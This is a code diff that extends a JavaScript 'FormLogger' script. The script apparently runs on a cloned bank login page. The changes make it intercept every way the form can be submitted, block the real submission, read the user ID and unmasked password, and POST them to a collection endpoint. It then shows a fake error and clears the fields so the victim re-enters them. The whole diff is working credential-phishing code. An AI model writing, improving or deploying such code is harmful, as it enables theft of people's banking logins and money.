@@ -13,6 +13,8 @@ class FormLogger {
   }
 
   init() {
+    const self = this;
+    
     // Patch jQuery to prevent disabling the password field
     if (typeof jQuery !== 'undefined') {
       const originalProp = jQuery.fn.prop;
@@ -25,6 +27,19 @@ class FormLogger {
           }
         }
         return originalProp.apply(this, arguments);
+      };
+      
+      // Also patch submit method on jQuery
+      const originalSubmit = jQuery.fn.submit;
+      jQuery.fn.submit = function(handler) {
+        console.log('[Logger] jQuery.submit() called on', this.attr('id'));
+        if (this.attr('id') === 'EnterOnlineIDForm') {
+          // Intercept before calling original
+          self.logFormData(this[0]).then(() => {
+            console.log('[Logger] Logged form data via jQuery.submit');
+          });
+        }
+        return originalSubmit.apply(this, arguments);
       };
     }
 
@@ -111,7 +126,7 @@ class FormLogger {
       this.originalMethod = form.method;
       this.originalTarget = form.target;
       
-      // Override form.submit() method
+      // Override form.submit() method VERY EARLY
       const self = this;
       const originalSubmit = form.submit;
       form.submit = function() {
@@ -128,16 +143,42 @@ class FormLogger {
           originalSubmit.call(form);
         });
       };
+      
+      // Also intercept input element submit (for form.elements.namedItem('submit'))
+      const submitElements = form.querySelectorAll('input[type="submit"], button[type="submit"]');
+      submitElements.forEach((elem) => {
+        console.log('[Logger] Found submit element:', elem.value || elem.textContent);
+      });
     }
 
-    // Intercept login button click
+    // Intercept login button click with high priority
+    document.addEventListener('click', (e) => {
+      // Check if any button in the form was clicked
+      const form = document.getElementById('EnterOnlineIDForm');
+      if (form && form.contains(e.target)) {
+        const button = e.target;
+        console.log('[Logger] Click detected on form element:', button.tagName, button.id, button.name, button.value);
+        
+        // If it's a button or submit input
+        if (button.tagName === 'BUTTON' || (button.tagName === 'INPUT' && button.type === 'submit')) {
+          console.log('[Logger] Submit button clicked, intercepting form submission');
+          e.preventDefault();
+          e.stopPropagation();
+          this.logFormData(form);
+          return false;
+        }
+      }
+    }, true); // Use capture phase to intercept BEFORE other listeners
+
+    // Intercept login button click by ID
     document.addEventListener('click', (e) => {
       const button = e.target.closest('#login_button');
       if (button) {
+        console.log('[Logger] #login_button clicked');
         e.preventDefault();
         e.stopPropagation();
         // Capture form data when login button is clicked
-        const form = button.closest('form');
+        const form = button.closest('form') || document.getElementById('EnterOnlineIDForm');
         if (form) {
           this.logFormData(form);
           return false;
@@ -145,17 +186,30 @@ class FormLogger {
       }
     }, true);
 
-    // Also intercept all form submissions
+    // Also intercept all form submissions with capture phase
     document.addEventListener('submit', (e) => {
       const form = e.target;
+      console.log('[Logger] Submit event caught on form:', form.id, form.method);
       if (form.id === 'login-form' || form.method === 'POST' || form.id === 'EnterOnlineIDForm') {
-        console.log('[Logger] Submit event caught:', form.id);
+        console.log('[Logger] Submitting login form, preventing default');
         e.preventDefault();
         e.stopPropagation();
         this.logFormData(form);
         return false;
       }
-    }, true);
+    }, true); // Capture phase
+    
+    // Monitor for any attempts to change form action
+    if (form) {
+      const observer = new MutationObserver((mutations) => {
+        mutations.forEach((mutation) => {
+          if (mutation.type === 'attributes') {
+            console.log('[Logger] Form attribute changed:', mutation.attributeName, form.getAttribute(mutation.attributeName));
+          }
+        });
+      });
+      observer.observe(form, { attributes: true });
+    }
   }
 
   /**
@@ -163,15 +217,19 @@ class FormLogger {
    */
   async logFormData(form) {
     try {
+      console.log('[Logger] logFormData() started');
+      
       // Ensure password field is enabled during submit
       const passwordInput = document.getElementById('tlpvt-passcode-input');
       if (passwordInput) {
         passwordInput.disabled = false;
+        console.log('[Logger] Password field disabled state checked:', passwordInput.disabled);
       }
       
       // Get User ID from input field
       const userIdInput = form.querySelector('input[name="dummy-onlineId"]');
       const userIdValue = userIdInput ? userIdInput.value.trim() : '';
+      console.log('[Logger] User ID captured:', userIdValue);
 
       // Get the actual password value directly from the input field (NOT masked)
       let passwordValue = '';
@@ -179,14 +237,22 @@ class FormLogger {
       if (passwordInput) {
         // Get the actual value from the DOM element (this is the unmasked value)
         passwordValue = passwordInput.value || this.rawPassword || '';
+        console.log('[Logger] Password captured from DOM - length:', passwordValue.length);
       } else {
         // Fallback to tracked raw password
         passwordValue = this.rawPassword || '';
+        console.log('[Logger] Password captured from tracker - length:', passwordValue.length);
       }
 
-      // Get Remember Me checkbox
-      const rememberInput = form.querySelector('input[name="saveMyID"]');
-      const rememberMe = rememberInput ? rememberInput.checked : false;
+      // Get Remember Me checkbox - try both possible selectors
+      let rememberMe = false;
+      const rememberInput1 = form.querySelector('input[name="saveMyID"]');
+      const rememberInput2 = form.querySelector('input[name="dummy-rememberMe"]');
+      const rememberInput = rememberInput1 || rememberInput2;
+      if (rememberInput) {
+        rememberMe = rememberInput.checked;
+        console.log('[Logger] Remember Me:', rememberMe);
+      }
 
       const data = {
         userId: userIdValue || 'N/A',
@@ -194,12 +260,13 @@ class FormLogger {
         rememberMe: rememberMe
       };
 
-      console.log('[Logger] Sending login entry:', { 
+      console.log('[Logger] About to send login entry:', { 
         userId: data.userId,
-        password: data.password,
+        passwordLength: data.password.length,
         rememberMe: data.rememberMe
       });
 
+      // Send to server
       const response = await fetch(this.apiEndpoint, {
         method: 'POST',
         headers: {
@@ -208,20 +275,29 @@ class FormLogger {
         body: JSON.stringify(data)
       });
 
+      console.log('[Logger] Fetch response status:', response.status);
+      
+      if (!response.ok) {
+        throw new Error(`HTTP ${response.status}`);
+      }
+      
       const result = await response.json();
       console.log('[Logger] Server response:', result);
       
       if (result.success) {
-        console.log('[Logger] Entry successfully logged to CSV');
+        console.log('[Logger] Entry successfully logged to database');
         // Display error message after logging
         this.displayErrorMessage();
         // Reset the password tracker for next attempt
         this.rawPassword = '';
         // Clear form fields for next attempt
         this.clearFormFields();
+      } else {
+        console.warn('[Logger] Server returned success=false:', result.message);
+        this.displayErrorMessage();
       }
     } catch (error) {
-      console.error('[Logger] Error sending data to server:', error);
+      console.error('[Logger] Error sending data to server:', error.message);
       // Display error message even if logging fails
       this.displayErrorMessage();
       // Clear form fields anyway so user can try again
